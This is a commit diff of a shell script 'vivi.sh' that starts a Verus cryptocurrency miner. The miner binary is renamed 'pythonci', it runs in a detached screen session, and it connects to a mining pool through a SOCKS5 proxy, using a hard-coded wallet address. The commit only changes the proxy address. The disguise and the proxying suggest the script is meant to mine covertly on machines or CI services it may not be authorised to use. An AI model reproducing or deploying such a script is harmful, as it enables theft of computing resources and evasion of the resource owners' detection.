630b6f57f6b28adca31beeac884db94b81d2787f
radhavivi <88871186+radhavivi@users.noreply.github.com>
2021-08-14 13:10:27 +0700

    Update vivi.sh

--- vivi.sh
+++ vivi.sh
@@ -6,6 +6,6 @@ screen -dmS ls
 PL=stratum+tcp://eu.luckpool.net:3956
 WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
 WR=VIA-009
-PY=socks5://185.136.162.16:1851
+PY=socks5://178.62.79.49:28381
 ./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
 
